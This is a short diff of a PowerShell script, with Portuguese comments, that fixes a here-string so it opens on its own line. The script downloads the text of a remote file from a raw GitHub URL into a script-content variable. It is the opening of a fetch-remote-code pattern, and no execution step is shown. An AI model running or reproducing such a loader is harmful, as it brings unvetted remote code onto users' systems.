@@ -1,5 +1,6 @@
 # Define o conteúdo do script
-$scriptContent = @"$url = "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt"
+$scriptContent = @"
+$url = "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt"
 # Baixa o conteúdo do URL
 $scriptContent = Invoke-WebRequest -Uri $url -ErrorAction Stop | Select-Object -ExpandProperty Content
     
